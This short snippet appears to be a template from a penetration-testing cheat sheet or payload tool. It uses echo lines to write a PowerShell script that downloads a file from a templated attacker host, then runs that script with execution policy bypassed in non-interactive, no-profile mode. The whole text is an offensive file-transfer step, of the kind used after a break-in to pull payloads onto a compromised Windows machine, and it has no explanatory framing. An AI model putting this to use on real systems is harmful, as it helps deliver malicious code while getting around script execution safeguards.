echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://{{ host.ip }}:{{ host.port }}/$f" >>wget.ps1
echo $file = "$0" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1


Usage:
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1

